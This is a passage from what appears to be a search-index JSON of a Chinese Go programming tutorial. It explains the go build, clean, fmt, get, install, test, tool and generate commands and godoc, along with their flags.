build</code>\u547d\u4ee4\u9ed8\u8ba4\u4f1a\u7f16\u8bd1\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709go\u6587\u4ef6\u3002</p> </li> <li> <p>\u4f60\u4e5f\u53ef\u4ee5\u6307\u5b9a\u7f16\u8bd1\u8f93\u51fa\u7684\u6587\u4ef6\u540d\u3002\u4f8b\u59821.2\u8282\u4e2d\u7684<code>mathapp</code>\u5e94\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a<code>go build -o astaxie.exe</code>\uff0c\u9ed8\u8ba4\u60c5\u51b5\u662f\u4f60\u7684package\u540d(\u975emain\u5305)\uff0c\u6216\u8005\u662f\u7b2c\u4e00\u4e2a\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u540d(main\u5305)\u3002</p> </li> </ul> <p>\uff08\u6ce8\uff1a\u5b9e\u9645\u4e0a\uff0cpackage\u540d\u5728Go\u8bed\u8a00\u89c4\u8303\u4e2d\u6307\u4ee3\u7801\u4e2d\u201cpackage\u201d\u540e\u4f7f\u7528\u7684\u540d\u79f0\uff0c\u6b64\u540d\u79f0\u53ef\u4ee5\u4e0e\u6587\u4ef6\u5939\u540d\u4e0d\u540c\u3002\u9ed8\u8ba4\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u540d\u662f\u6587\u4ef6\u5939\u540d\u3002\uff09</p> <ul> <li> <p>go build\u4f1a\u5ffd\u7565\u76ee\u5f55\u4e0b\u4ee5\u201c_\u201d\u6216\u201c.\u201d\u5f00\u5934\u7684go\u6587\u4ef6\u3002</p> </li> <li> <p>\u5982\u679c\u4f60\u7684\u6e90\u4ee3\u7801\u9488\u5bf9\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u9700\u8981\u4e0d\u540c\u7684\u5904\u7406\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u540e\u7f00\u6765\u547d\u540d\u6587\u4ef6\u3002\u4f8b\u5982\u6709\u4e00\u4e2a\u8bfb\u53d6\u6570\u7ec4\u7684\u7a0b\u5e8f\uff0c\u5b83\u5bf9\u4e8e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u53ef\u80fd\u6709\u5982\u4e0b\u51e0\u4e2a\u6e90\u6587\u4ef6\uff1a</p> <p>array_linux.go array_darwin.go array_windows.go array_freebsd.go</p> </li> </ul> <p><code>go build</code>\u7684\u65f6\u5019\u4f1a\u9009\u62e9\u6027\u5730\u7f16\u8bd1\u4ee5\u7cfb\u7edf\u540d\u7ed3\u5c3e\u7684\u6587\u4ef6\uff08Linux\u3001Darwin\u3001Windows\u3001Freebsd\uff09\u3002\u4f8b\u5982Linux\u7cfb\u7edf\u4e0b\u9762\u7f16\u8bd1\u53ea\u4f1a\u9009\u62e9array_linux.go\u6587\u4ef6\uff0c\u5176\u5b83\u7cfb\u7edf\u547d\u540d\u540e\u7f00\u6587\u4ef6\u5168\u90e8\u5ffd\u7565\u3002</p> <p>\u53c2\u6570\u7684\u4ecb\u7ecd</p> <ul> <li><code>-o</code> \u6307\u5b9a\u8f93\u51fa\u7684\u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u5e26\u4e0a\u8def\u5f84\uff0c\u4f8b\u5982 <code>go build -o a/b/c</code></li> <li><code>-i</code> \u5b89\u88c5\u76f8\u5e94\u7684\u5305\uff0c\u7f16\u8bd1+<code>go install</code></li> <li><code>-a</code> \u66f4\u65b0\u5168\u90e8\u5df2\u7ecf\u662f\u6700\u65b0\u7684\u5305\u7684\uff0c\u4f46\u662f\u5bf9\u6807\u51c6\u5305\u4e0d\u9002\u7528</li> <li><code>-n</code> \u628a\u9700\u8981\u6267\u884c\u7684\u7f16\u8bd1\u547d\u4ee4\u6253\u5370\u51fa\u6765\uff0c\u4f46\u662f\u4e0d\u6267\u884c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u77e5\u9053\u5e95\u5c42\u662f\u5982\u4f55\u8fd0\u884c\u7684</li> <li><code>-p n</code> \u6307\u5b9a\u53ef\u4ee5\u5e76\u884c\u53ef\u8fd0\u884c\u7684\u7f16\u8bd1\u6570\u76ee\uff0c\u9ed8\u8ba4\u662fCPU\u6570\u76ee</li> <li><code>-race</code> \u5f00\u542f\u7f16\u8bd1\u7684\u65f6\u5019\u81ea\u52a8\u68c0\u6d4b\u6570\u636e\u7ade\u4e89\u7684\u60c5\u51b5\uff0c\u76ee\u524d\u53ea\u652f\u630164\u4f4d\u7684\u673a\u5668</li> <li><code>-v</code> \u6253\u5370\u51fa\u6765\u6211\u4eec\u6b63\u5728\u7f16\u8bd1\u7684\u5305\u540d</li> <li><code>-work</code> \u6253\u5370\u51fa\u6765\u7f16\u8bd1\u65f6\u5019\u7684\u4e34\u65f6\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u5e76\u4e14\u5982\u679c\u5df2\u7ecf\u5b58\u5728\u7684\u8bdd\u5c31\u4e0d\u8981\u5220\u9664</li> <li><code>-x</code> \u6253\u5370\u51fa\u6765\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5176\u5b9e\u5c31\u662f\u548c<code>-n</code>\u7684\u7ed3\u679c\u7c7b\u4f3c\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f1a\u6267\u884c</li> <li><code>-ccflags 'arg list'</code> \u4f20\u9012\u53c2\u6570\u7ed95c, 6c, 8c \u8c03\u7528</li> <li><code>-compiler name</code> \u6307\u5b9a\u76f8\u5e94\u7684\u7f16\u8bd1\u5668\uff0cgccgo\u8fd8\u662fgc</li> <li><code>-gccgoflags 'arg list'</code> \u4f20\u9012\u53c2\u6570\u7ed9gccgo\u7f16\u8bd1\u8fde\u63a5\u8c03\u7528</li> <li><code>-gcflags 'arg list'</code> \u4f20\u9012\u53c2\u6570\u7ed95g, 6g, 8g \u8c03\u7528</li> <li><code>-installsuffix suffix</code> \u4e3a\u4e86\u548c\u9ed8\u8ba4\u7684\u5b89\u88c5\u5305\u533a\u522b\u5f00\u6765\uff0c\u91c7\u7528\u8fd9\u4e2a\u524d\u7f00\u6765\u91cd\u65b0\u5b89\u88c5\u90a3\u4e9b\u4f9d\u8d56\u7684\u5305\uff0c<code>-race</code>\u7684\u65f6\u5019\u9ed8\u8ba4\u5df2\u7ecf\u662f<code>-installsuffix race</code>,\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7<code>-n</code>\u547d\u4ee4\u6765\u9a8c\u8bc1</li> <li><code>-ldflags 'flag list'</code> \u4f20\u9012\u53c2\u6570\u7ed95l, 6l, 8l \u8c03\u7528</li> <li><code>-tags 'tag list'</code> \u8bbe\u7f6e\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u53ef\u4ee5\u9002\u914d\u7684\u90a3\u4e9btag\uff0c\u8be6\u7ec6\u7684tag\u9650\u5236\u53c2\u8003\u91cc\u9762\u7684 Build Constraints</li> </ul>"},{"location":"01.3/#go-clean","title":"go clean","text":"<p>\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u79fb\u9664\u5f53\u524d\u6e90\u7801\u5305\u548c\u5173\u8054\u6e90\u7801\u5305\u91cc\u9762\u7f16\u8bd1\u751f\u6210\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u5305\u62ec</p> <pre><code>_obj/            \u65e7\u7684object\u76ee\u5f55\uff0c\u7531Makefiles\u9057\u7559\n_test/           \u65e7\u7684test\u76ee\u5f55\uff0c\u7531Makefiles\u9057\u7559\n_testmain.go     \u65e7\u7684gotest\u6587\u4ef6\uff0c\u7531Makefiles\u9057\u7559\ntest.out         \u65e7\u7684test\u8bb0\u5f55\uff0c\u7531Makefiles\u9057\u7559\nbuild.out        \u65e7\u7684test\u8bb0\u5f55\uff0c\u7531Makefiles\u9057\u7559\n*.[568ao]        object\u6587\u4ef6\uff0c\u7531Makefiles\u9057\u7559\n\nDIR(.exe)        \u7531go build\u4ea7\u751f\nDIR.test(.exe)   \u7531go test -c\u4ea7\u751f\nMAINFILE(.exe)   \u7531go build MAINFILE.go\u4ea7\u751f\n*.so             \u7531 SWIG \u4ea7\u751f\n</code></pre> <p>\u6211\u4e00\u822c\u90fd\u662f\u5229\u7528\u8fd9\u4e2a\u547d\u4ee4\u6e05\u9664\u7f16\u8bd1\u6587\u4ef6\uff0c\u7136\u540eGitHub\u9012\u4ea4\u6e90\u7801\uff0c\u5728\u672c\u673a\u6d4b\u8bd5\u7684\u65f6\u5019\u8fd9\u4e9b\u7f16\u8bd1\u6587\u4ef6\u90fd\u662f\u548c\u7cfb\u7edf\u76f8\u5173\u7684\uff0c\u4f46\u662f\u5bf9\u4e8e\u6e90\u7801\u7ba1\u7406\u6765\u8bf4\u6ca1\u5fc5\u8981\u3002</p> <pre><code>$ go clean -i -n\ncd /Users/astaxie/develop/gopath/src/mathapp\nrm -f mathapp mathapp.exe mathapp.test mathapp.test.exe app app.exe\nrm -f /Users/astaxie/develop/gopath/bin/mathapp\n</code></pre> <p>\u53c2\u6570\u4ecb\u7ecd</p> <ul> <li><code>-i</code> \u6e05\u9664\u5173\u8054\u7684\u5b89\u88c5\u7684\u5305\u548c\u53ef\u8fd0\u884c\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7go install\u5b89\u88c5\u7684\u6587\u4ef6</li> <li><code>-n</code> \u628a\u9700\u8981\u6267\u884c\u7684\u6e05\u9664\u547d\u4ee4\u6253\u5370\u51fa\u6765\uff0c\u4f46\u662f\u4e0d\u6267\u884c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u77e5\u9053\u5e95\u5c42\u662f\u5982\u4f55\u8fd0\u884c\u7684</li> <li><code>-r</code> \u5faa\u73af\u7684\u6e05\u9664\u5728import\u4e2d\u5f15\u5165\u7684\u5305</li> <li><code>-x</code> \u6253\u5370\u51fa\u6765\u6267\u884c\u7684\u8be6\u7ec6\u547d\u4ee4\uff0c\u5176\u5b9e\u5c31\u662f<code>-n</code>\u6253\u5370\u7684\u6267\u884c\u7248\u672c</li> </ul>"},{"location":"01.3/#go-fmt","title":"go fmt","text":"<p>\u6709\u8fc7C/C++\u7ecf\u9a8c\u7684\u8bfb\u8005\u4f1a\u77e5\u9053,\u4e00\u4e9b\u4eba\u7ecf\u5e38\u4e3a\u4ee3\u7801\u91c7\u53d6K&amp;R\u98ce\u683c\u8fd8\u662fANSI\u98ce\u683c\u800c\u4e89\u8bba\u4e0d\u4f11\u3002\u5728go\u4e2d\uff0c\u4ee3\u7801\u5219\u6709\u6807\u51c6\u7684\u98ce\u683c\u3002\u7531\u4e8e\u4e4b\u524d\u5df2\u7ecf\u6709\u7684\u4e00\u4e9b\u4e60\u60ef\u6216\u5176\u5b83\u7684\u539f\u56e0\u6211\u4eec\u5e38\u5c06\u4ee3\u7801\u5199\u6210ANSI\u98ce\u683c\u6216\u8005\u5176\u5b83\u66f4\u5408\u9002\u81ea\u5df1\u7684\u683c\u5f0f\uff0c\u8fd9\u5c06\u4e3a\u4eba\u4eec\u5728\u9605\u8bfb\u522b\u4eba\u7684\u4ee3\u7801\u65f6\u6dfb\u52a0\u4e0d\u5fc5\u8981\u7684\u8d1f\u62c5\uff0c\u6240\u4ee5go\u5f3a\u5236\u4e86\u4ee3\u7801\u683c\u5f0f\uff08\u6bd4\u5982\u5de6\u5927\u62ec\u53f7\u5fc5\u987b\u653e\u5728\u884c\u5c3e\uff09\uff0c\u4e0d\u6309\u7167\u6b64\u683c\u5f0f\u7684\u4ee3\u7801\u5c06\u4e0d\u80fd\u7f16\u8bd1\u901a\u8fc7\uff0c\u4e3a\u4e86\u51cf\u5c11\u6d6a\u8d39\u5728\u6392\u7248\u4e0a\u7684\u65f6\u95f4\uff0cgo\u5de5\u5177\u96c6\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a<code>go fmt</code>\u547d\u4ee4 \u5b83\u53ef\u4ee5\u5e2e\u4f60\u683c\u5f0f\u5316\u4f60\u5199\u597d\u7684\u4ee3\u7801\u6587\u4ef6\uff0c\u4f7f\u4f60\u5199\u4ee3\u7801\u7684\u65f6\u5019\u4e0d\u9700\u8981\u5173\u5fc3\u683c\u5f0f\uff0c\u4f60\u53ea\u9700\u8981\u5728\u5199\u5b8c\u4e4b\u540e\u6267\u884c<code>go fmt &lt;\u6587\u4ef6\u540d&gt;.go</code>\uff0c\u4f60\u7684\u4ee3\u7801\u5c31\u88ab\u4fee\u6539\u6210\u4e86\u6807\u51c6\u683c\u5f0f\uff0c\u4f46\u662f\u6211\u5e73\u5e38\u5f88\u5c11\u7528\u5230\u8fd9\u4e2a\u547d\u4ee4\uff0c\u56e0\u4e3a\u5f00\u53d1\u5de5\u5177\u91cc\u9762\u4e00\u822c\u90fd\u5e26\u4e86\u4fdd\u5b58\u65f6\u5019\u81ea\u52a8\u683c\u5f0f\u5316\u529f\u80fd\uff0c\u8fd9\u4e2a\u529f\u80fd\u5176\u5b9e\u5728\u5e95\u5c42\u5c31\u662f\u8c03\u7528\u4e86<code>go fmt</code>\u3002\u63a5\u4e0b\u6765\u7684\u4e00\u8282\u6211\u5c06\u8bb2\u8ff0\u4e24\u4e2a\u5de5\u5177\uff0c\u8fd9\u4e24\u4e2a\u5de5\u5177\u90fd\u81ea\u5e26\u4e86\u4fdd\u5b58\u6587\u4ef6\u65f6\u81ea\u52a8\u5316<code>go fmt</code>\u529f\u80fd\u3002</p> <p>\u4f7f\u7528go fmt\u547d\u4ee4\uff0c\u5176\u5b9e\u662f\u8c03\u7528\u4e86gofmt\uff0c\u800c\u4e14\u9700\u8981\u53c2\u6570-w\uff0c\u5426\u5219\u683c\u5f0f\u5316\u7ed3\u679c\u4e0d\u4f1a\u5199\u5165\u6587\u4ef6\u3002gofmt -w -l src\uff0c\u53ef\u4ee5\u683c\u5f0f\u5316\u6574\u4e2a\u9879\u76ee\u3002</p> <p>\u6240\u4ee5go fmt\u662fgofmt\u7684\u4e0a\u5c42\u4e00\u4e2a\u5305\u88c5\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u60f3\u8981\u66f4\u591a\u7684\u4e2a\u6027\u5316\u7684\u683c\u5f0f\u5316\u53ef\u4ee5\u53c2\u8003 gofmt</p> <p>gofmt\u7684\u53c2\u6570\u4ecb\u7ecd</p> <ul> <li><code>-l</code> \u663e\u793a\u90a3\u4e9b\u9700\u8981\u683c\u5f0f\u5316\u7684\u6587\u4ef6</li> <li><code>-w</code> \u628a\u6539\u5199\u540e\u7684\u5185\u5bb9\u76f4\u63a5\u5199\u5165\u5230\u6587\u4ef6\u4e2d\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u7ed3\u679c\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u3002</li> <li><code>-r</code> \u6dfb\u52a0\u5f62\u5982\u201ca[b:len(a)] -&gt; a[b:]\u201d\u7684\u91cd\u5199\u89c4\u5219\uff0c\u65b9\u4fbf\u6211\u4eec\u505a\u6279\u91cf\u66ff\u6362</li> <li><code>-s</code> \u7b80\u5316\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801</li> <li><code>-d</code> \u663e\u793a\u683c\u5f0f\u5316\u524d\u540e\u7684diff\u800c\u4e0d\u662f\u5199\u5165\u6587\u4ef6\uff0c\u9ed8\u8ba4\u662ffalse</li> <li><code>-e</code> \u6253\u5370\u6240\u6709\u7684\u8bed\u6cd5\u9519\u8bef\u5230\u6807\u51c6\u8f93\u51fa\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u6b64\u6807\u8bb0\uff0c\u5219\u53ea\u4f1a\u6253\u5370\u4e0d\u540c\u884c\u7684\u524d10\u4e2a\u9519\u8bef\u3002</li> <li><code>-cpuprofile</code> \u652f\u6301\u8c03\u8bd5\u6a21\u5f0f\uff0c\u5199\u5165\u76f8\u5e94\u7684cpufile\u5230\u6307\u5b9a\u7684\u6587\u4ef6</li> </ul>"},{"location":"01.3/#go-get","title":"go get","text":"<p>\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u52a8\u6001\u83b7\u53d6\u8fdc\u7a0b\u4ee3\u7801\u5305\u7684\uff0c\u76ee\u524d\u652f\u6301\u7684\u6709BitBucket\u3001GitHub\u3001Google Code\u548cLaunchpad\u3002\u8fd9\u4e2a\u547d\u4ee4\u5728\u5185\u90e8\u5b9e\u9645\u4e0a\u5206\u6210\u4e86\u4e24\u6b65\u64cd\u4f5c\uff1a\u7b2c\u4e00\u6b65\u662f\u4e0b\u8f7d\u6e90\u7801\u5305\uff0c\u7b2c\u4e8c\u6b65\u662f\u6267\u884c<code>go install</code>\u3002\u4e0b\u8f7d\u6e90\u7801\u5305\u7684go\u5de5\u5177\u4f1a\u81ea\u52a8\u6839\u636e\u4e0d\u540c\u7684\u57df\u540d\u8c03\u7528\u4e0d\u540c\u7684\u6e90\u7801\u5de5\u5177\uff0c\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a</p> <pre><code>BitBucket (Mercurial Git)\nGitHub (Git)\nGoogle Code Project Hosting (Git, Mercurial, Subversion)\nLaunchpad (Bazaar)\n</code></pre> <p>\u6240\u4ee5\u4e3a\u4e86<code>go get</code> \u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f60\u5fc5\u987b\u786e\u4fdd\u5b89\u88c5\u4e86\u5408\u9002\u7684\u6e90\u7801\u7ba1\u7406\u5de5\u5177\uff0c\u5e76\u540c\u65f6\u628a\u8fd9\u4e9b\u547d\u4ee4\u52a0\u5165\u4f60\u7684PATH\u4e2d\u3002\u5176\u5b9e<code>go get</code>\u652f\u6301\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u529f\u80fd\uff0c\u5177\u4f53\u53c2\u89c1<code>go help remote</code>\u3002</p> <p>\u53c2\u6570\u4ecb\u7ecd\uff1a</p> <ul> <li><code>-d</code> \u53ea\u4e0b\u8f7d\u4e0d\u5b89\u88c5</li> <li><code>-f</code> \u53ea\u6709\u5728\u4f60\u5305\u542b\u4e86<code>-u</code>\u53c2\u6570\u7684\u65f6\u5019\u624d\u6709\u6548\uff0c\u4e0d\u8ba9<code>-u</code>\u53bb\u9a8c\u8bc1import\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u5df2\u7ecf\u83b7\u53d6\u4e86\uff0c\u8fd9\u5bf9\u4e8e\u672c\u5730fork\u7684\u5305\u7279\u522b\u6709\u7528</li> <li><code>-fix</code> \u5728\u83b7\u53d6\u6e90\u7801\u4e4b\u540e\u5148\u8fd0\u884cfix\uff0c\u7136\u540e\u518d\u53bb\u505a\u5176\u4ed6\u7684\u4e8b\u60c5</li> <li><code>-t</code> \u540c\u65f6\u4e5f\u4e0b\u8f7d\u9700\u8981\u4e3a\u8fd0\u884c\u6d4b\u8bd5\u6240\u9700\u8981\u7684\u5305</li> <li><code>-u</code> \u5f3a\u5236\u4f7f\u7528\u7f51\u7edc\u53bb\u66f4\u65b0\u5305\u548c\u5b83\u7684\u4f9d\u8d56\u5305</li> <li><code>-v</code> \u663e\u793a\u6267\u884c\u7684\u547d\u4ee4</li> </ul>"},{"location":"01.3/#go-install","title":"go install","text":"<p>\u8fd9\u4e2a\u547d\u4ee4\u5728\u5185\u90e8\u5b9e\u9645\u4e0a\u5206\u6210\u4e86\u4e24\u6b65\u64cd\u4f5c\uff1a\u7b2c\u4e00\u6b65\u662f\u751f\u6210\u7ed3\u679c\u6587\u4ef6(\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005.a\u5305)\uff0c\u7b2c\u4e8c\u6b65\u4f1a\u628a\u7f16\u8bd1\u597d\u7684\u7ed3\u679c\u79fb\u5230<code>$GOPATH/pkg</code>\u6216\u8005<code>$GOPATH/bin</code>\u3002</p> <p>\u53c2\u6570\u652f\u6301<code>go build</code>\u7684\u7f16\u8bd1\u53c2\u6570\u3002\u5927\u5bb6\u53ea\u8981\u8bb0\u4f4f\u4e00\u4e2a\u53c2\u6570<code>-v</code>\u5c31\u597d\u4e86\uff0c\u8fd9\u4e2a\u968f\u65f6\u968f\u5730\u7684\u53ef\u4ee5\u67e5\u770b\u5e95\u5c42\u7684\u6267\u884c\u4fe1\u606f\u3002</p>"},{"location":"01.3/#go-test","title":"go test","text":"<p>\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u6e90\u7801\u76ee\u5f55\u4e0b\u9762\u540d\u4e3a<code>*_test.go</code>\u7684\u6587\u4ef6\uff0c\u751f\u6210\u5e76\u8fd0\u884c\u6d4b\u8bd5\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\u8f93\u51fa\u7684\u4fe1\u606f\u7c7b\u4f3c</p> <pre><code>ok   archive/tar   0.011s\nFAIL archive/zip   0.022s\nok   compress/gzip 0.033s\n...\n</code></pre> <p>\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u7684\u53c2\u6570\uff0c\u5b83\u4f1a\u81ea\u52a8\u628a\u4f60\u6e90\u7801\u5305\u4e0b\u9762\u6240\u6709test\u6587\u4ef6\u6d4b\u8bd5\u5b8c\u6bd5\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5e26\u4e0a\u53c2\u6570\uff0c\u8be6\u60c5\u8bf7\u53c2\u8003<code>go help testflag</code></p> <p>\u8fd9\u91cc\u6211\u4ecb\u7ecd\u51e0\u4e2a\u6211\u4eec\u5e38\u7528\u7684\u53c2\u6570\uff1a</p> <ul> <li><code>-bench regexp</code> \u6267\u884c\u76f8\u5e94\u7684benchmarks\uff0c\u4f8b\u5982 <code>-bench=.</code></li> <li><code>-cover</code> \u5f00\u542f\u6d4b\u8bd5\u8986\u76d6\u7387</li> <li><code>-run regexp</code> \u53ea\u8fd0\u884cregexp\u5339\u914d\u7684\u51fd\u6570\uff0c\u4f8b\u5982 <code>-run=Array</code> \u90a3\u4e48\u5c31\u6267\u884c\u5305\u542b\u6709Array\u5f00\u5934\u7684\u51fd\u6570</li> <li><code>-v</code> \u663e\u793a\u6d4b\u8bd5\u7684\u8be6\u7ec6\u547d\u4ee4</li> </ul>"},{"location":"01.3/#go-tool","title":"go tool","text":"<p><code>go tool</code>\u4e0b\u9762\u4e0b\u8f7d\u805a\u96c6\u4e86\u5f88\u591a\u547d\u4ee4\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u4ecb\u7ecd\u4e24\u4e2a\uff0cfix\u548cvet</p> <ul> <li><code>go tool fix .</code> \u7528\u6765\u4fee\u590d\u4ee5\u524d\u8001\u7248\u672c\u7684\u4ee3\u7801\u5230\u65b0\u7248\u672c\uff0c\u4f8b\u5982go1\u4e4b\u524d\u8001\u7248\u672c\u7684\u4ee3\u7801\u8f6c\u5316\u5230go1,\u4f8b\u5982API\u7684\u53d8\u5316</li> <li><code>go tool vet directory|files</code> \u7528\u6765\u5206\u6790\u5f53\u524d\u76ee\u5f55\u7684\u4ee3\u7801\u662f\u5426\u90fd\u662f\u6b63\u786e\u7684\u4ee3\u7801,\u4f8b\u5982\u662f\u4e0d\u662f\u8c03\u7528fmt.Printf\u91cc\u9762\u7684\u53c2\u6570\u4e0d\u6b63\u786e\uff0c\u4f8b\u5982\u51fd\u6570\u91cc\u9762\u63d0\u524dreturn\u4e86\u7136\u540e\u51fa\u73b0\u4e86\u65e0\u7528\u4ee3\u7801\u4e4b\u7c7b\u7684\u3002</li> </ul>"},{"location":"01.3/#go-generate","title":"go generate","text":"<p>\u8fd9\u4e2a\u547d\u4ee4\u662f\u4eceGo1.4\u5f00\u59cb\u624d\u8bbe\u8ba1\u7684\uff0c\u7528\u4e8e\u5728\u7f16\u8bd1\u524d\u81ea\u52a8\u5316\u751f\u6210\u67d0\u7c7b\u4ee3\u7801\u3002<code>go generate</code>\u548c<code>go build</code>\u662f\u5b8c\u5168\u4e0d\u4e00\u6837\u7684\u547d\u4ee4\uff0c\u901a\u8fc7\u5206\u6790\u6e90\u7801\u4e2d\u7279\u6b8a\u7684\u6ce8\u91ca\uff0c\u7136\u540e\u6267\u884c\u76f8\u5e94\u7684\u547d\u4ee4\u3002\u8fd9\u4e9b\u547d\u4ee4\u90fd\u662f\u5f88\u660e\u786e\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u4f9d\u8d56\u5728\u91cc\u9762\u3002\u800c\u4e14\u5927\u5bb6\u5728\u7528\u8fd9\u4e2a\u4e4b\u524d\u5fc3\u91cc\u9762\u4e00\u5b9a\u8981\u6709\u4e00\u4e2a\u7406\u5ff5\uff0c\u8fd9\u4e2a<code>go generate</code>\u662f\u7ed9\u4f60\u7528\u7684\uff0c\u4e0d\u662f\u7ed9\u4f7f\u7528\u4f60\u8fd9\u4e2a\u5305\u7684\u4eba\u7528\u7684\uff0c\u662f\u65b9\u4fbf\u4f60\u6765\u751f\u6210\u4e00\u4e9b\u4ee3\u7801\u7684\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u6765\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u4f8b\u5982\u6211\u4eec\u7ecf\u5e38\u4f1a\u4f7f\u7528<code>yacc</code>\u6765\u751f\u6210\u4ee3\u7801\uff0c\u90a3\u4e48\u6211\u4eec\u5e38\u7528\u8fd9\u6837\u7684\u547d\u4ee4\uff1a</p> <pre><code>go tool yacc -o gopher.go -p parser gopher.y\n</code></pre> <p>-o \u6307\u5b9a\u4e86\u8f93\u51fa\u7684\u6587\u4ef6\u540d\uff0c -p\u6307\u5b9a\u4e86package\u7684\u540d\u79f0\uff0c\u8fd9\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u547d\u4ee4\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8ba9<code>go generate</code>\u6765\u89e6\u53d1\u8fd9\u4e2a\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728\u5f53\u524d\u76ee\u5f55\u7684\u4efb\u610f\u4e00\u4e2a<code>xxx.go</code>\u6587\u4ef6\u91cc\u9762\u7684\u4efb\u610f\u4f4d\u7f6e\u589e\u52a0\u4e00\u884c\u5982\u4e0b\u7684\u6ce8\u91ca\uff1a</p> <pre><code>//go:generate go tool yacc -o gopher.go -p parser gopher.y\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u6ce8\u610f\u4e86\uff0c<code>//go:generate</code>\u662f\u6ca1\u6709\u4efb\u4f55\u7a7a\u683c\u7684\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u56fa\u5b9a\u7684\u683c\u5f0f\uff0c\u5728\u626b\u63cf\u6e90\u7801\u6587\u4ef6\u7684\u65f6\u5019\u5c31\u662f\u6839\u636e\u8fd9\u4e2a\u6765\u5224\u65ad\u7684\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u547d\u4ee4\u6765\u751f\u6210\uff0c\u7f16\u8bd1\uff0c\u6d4b\u8bd5\u3002\u5982\u679c<code>gopher.y</code>\u6587\u4ef6\u6709\u4fee\u6539\uff0c\u90a3\u4e48\u5c31\u91cd\u65b0\u6267\u884c<code>go generate</code>\u91cd\u65b0\u751f\u6210\u6587\u4ef6\u5c31\u597d\u3002</p> <pre><code>$ go generate\n$ go build\n$ go test\n</code></pre>"},{"location":"01.3/#godoc","title":"godoc","text":"<p>\u5728Go1.2\u7248\u672c\u4e4b\u524d\u8fd8\u652f\u6301<code>go doc</code>\u547d\u4ee4\uff0c\u4f46\u662f\u4e4b\u540e\u5168\u90e8\u79fb\u5230\u4e86godoc\u8fd9\u4e2a\u547d\u4ee4\u4e0b\uff0c\u9700\u8981\u8fd9\u6837\u5b89\u88c5<code>go get golang.org/x/tools/cmd/godoc</code></p> <p>\u5f88\u591a\u4eba\u8bf4go\u4e0d\u9700\u8981\u4efb\u4f55\u7684\u7b2c\u4e09\u65b9\u6587\u6863\uff0c\u4f8b\u5982chm\u624b\u518c\u4e4b\u7c7b\u7684\uff08\u5176\u5b9e\u6211\u5df2\u7ecf\u505a\u4e86\u4e00\u4e2a\u4e86\uff0cchm\u624b\u518c\uff09\uff0c\u56e0\u4e3a\u5b83\u5185\u90e8\u5c31\u6709\u4e00\u4e2a\u5f88\u5f3a\u5927\u7684\u6587\u6863\u5de5\u5177\u3002</p> <p>\u5982\u4f55\u67e5\u770b\u76f8\u5e94package\u7684\u6587\u6863\u5462\uff1f   \u4f8b\u5982builtin\u5305\uff0c\u90a3\u4e48\u6267\u884c<code>godoc builtin</code>   \u5982\u679c\u662fhttp\u5305\uff0c\u90a3\u4e48\u6267\u884c<code>godoc net/http</code>   \u67e5\u770b\u67d0\u4e00\u4e2a\u5305\u91cc\u9762\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u6267\u884c<code>godoc fmt Printf</code>   \u4e5f\u53ef\u4ee5\u67e5\u770b\u76f8\u5e94\u7684\u4ee3\u7801\uff0c\u6267\u884c<code>godoc -src fmt Printf</code></p> <p>\u901a\u8fc7\u547d\u4ee4\u5728\u547d\u4ee4\u884c\u6267\u884c godoc -http=:\u7aef\u53e3\u53f7 \u6bd4\u5982<code>godoc 